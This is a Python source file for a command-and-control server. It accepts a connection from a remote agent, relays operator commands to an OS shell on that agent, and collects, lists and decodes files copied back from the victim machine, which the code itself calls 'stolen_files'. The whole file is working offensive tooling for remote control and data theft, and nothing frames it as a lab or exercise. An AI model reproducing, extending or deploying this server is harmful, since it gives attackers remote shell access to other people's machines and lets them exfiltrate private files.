#!/usr/bin/env python3
import socket
import json
import base64
import os
from pathlib import Path
from datetime import datetime


class bcolors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

HOST = "127.0.0.1"
PORT = 9001

MENU_TEXT = """\
=== Command Menu ===
Type any command and press Enter.
Special commands:
  shell - Open OS command shell
  scan  - Scan for sensitive files
  extract <filename> - Extract files
Type 'exit' to close the session.
"""


class JsonSocket:
    """Line-delimited JSON over a socket using a file-like wrapper."""

    def __init__(self, sock: socket.socket):
        self._sock = sock
        self._fp = sock.makefile("rwb")

    def send(self, obj: dict) -> None:
        self._fp.write((json.dumps(obj) + "\n").encode("utf-8"))
        self._fp.flush()

    def recv(self) -> dict:
        line = self._fp.readline()
        if not line:
            raise ConnectionError("peer closed connection")
        return json.loads(line.decode("utf-8"))

    def close(self) -> None:
        try:
            self._fp.close()
        finally:
            self._sock.close()


class C2Server:
    def __init__(self, host: str, port: int, menu: str):
        self.host = host
        self.port = port
        self.menu = menu
        self._lsock: socket.socket = None
        self.stolen_files = {}  # Store copied files: {filename: {content, metadata}}

    def _listen(self) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.listen(1)
        self._lsock = s
        print(f"[server] listening on {self.host}:{self.port}")

    def _accept(self) -> JsonSocket:
        assert self._lsock is not None
        conn, addr = self._lsock.accept()
        print(f"[server] client connected from {addr}")
        return JsonSocket(conn)

    def run(self) -> None:
        try:
            self._listen()
            jsock = self._accept()
            try:
                print(self.menu)
                while True:
                    try:
                        cmd = input("server> ").strip()
                    except (EOFError, KeyboardInterrupt):
                        cmd = "exit"

                    if cmd.lower() == "shell":
                        self._shell(jsock)
                        
                    # elif cmd.lower() == "scan":
                    #     self._scan()
                        
                    # elif cmd.startswith("extract"):
                    #     self._extract_file(cmd)
                        
                    # else:
                    #     print("[server] closing session.")
                    #     break

            finally:
                jsock.close()
        finally:
            if self._lsock:
                self._lsock.close()
                
    def _shell(self, jsock: JsonSocket) -> None:
        """Open OS command shell."""
        while True:
            cmd = input(bcolors.PURPLE + "shell> " + bcolors.ENDC).strip()
            if cmd.lower() == "exit":
                print("[server] closing session.")
                break
            jsock.send({"type": "shell", "data": cmd})
            try:
                reply = jsock.recv()
                
            except ConnectionError:
                print("[server] agent disconnected.")
                break
            self.print_reply(reply)
            
    def print_reply(self, reply: dict) -> None:
        """Print the reply from the agent."""
        status = reply.get('status', '')
        if status == "OK":
            print(bcolors.OKGREEN + "SUCCESS" + bcolors.ENDC)
            print(reply.get('output', ''))
        else:
            print(bcolors.FAIL + "FAILED" + bcolors.ENDC)
            print(reply.get('output', ''))
        
        
            
    def _process_reply(self, reply: dict) -> None:
        """Process agent reply and store any copied files."""
        if reply.get("status") == "OK" and "data" in reply:
            data = reply["data"]
            if isinstance(data, dict) and "findings" in data:
                for finding in data["findings"]:
                    if "file_content" in finding and finding["file_content"]:
                        # Store the copied file
                        filename = os.path.basename(finding["path"])
                        # Make filename unique if it already exists
                        counter = 1
                        base_filename = filename
                        while filename in self.stolen_files:
                            name, ext = os.path.splitext(base_filename)
                            filename = f"{name}_{counter}{ext}"
                            counter += 1
                        
                        self.stolen_files[filename] = {
                            "content": finding["file_content"],
                            "original_path": finding["path"],
                            "reason": finding["reason"],
                            "detail": finding["detail"],
                            "timestamp": datetime.now().isoformat()
                        }
                        print(f"[server] Stored copied file: {filename} (from {finding['path']})")

    def _list_stolen_files(self) -> None:
        """List all files copied from agents."""
        if not self.stolen_files:
            print("[server] No stolen files stored.")
            return
        
        print(f"[server] {len(self.stolen_files)} stolen files:")
        for filename, metadata in self.stolen_files.items():
            print(f"  {filename}")
            print(f"    Original path: {metadata['original_path']}")
            print(f"    Reason: {metadata['reason']}")
            print(f"    Detail: {metadata['detail']}")
            print(f"    Timestamp: {metadata['timestamp']}")
            print()

    def _extract_file(self, command: str) -> None:
        """Extract a copied file to disk."""
        parts = command.split()
        if len(parts) < 2:
            print("[server] Usage: extract_file <filename>")
            return
        
        filename = parts[1]
        if filename not in self.stolen_files:
            print(f"[server] File '{filename}' not found in stolen files.")
            return
        
        try:
            # Create extracted_files directory if it doesn't exist
            extract_dir = Path("extracted_files")
            extract_dir.mkdir(exist_ok=True)
            
            # Decode and write the file
            file_data = self.stolen_files[filename]
            content = base64.b64decode(file_data["content"])
            
            output_path = extract_dir / filename
            with output_path.open("wb") as f:
                f.write(content)
            
            print(f"[server] Extracted '{filename}' to {output_path}")
            print(f"[server] Original path: {file_data['original_path']}")
        
        except (OSError, ValueError) as e:
            print(f"[server] Failed to extract file: {e}")


if __name__ == "__main__":
    C2Server(HOST, PORT, MENU_TEXT).run()
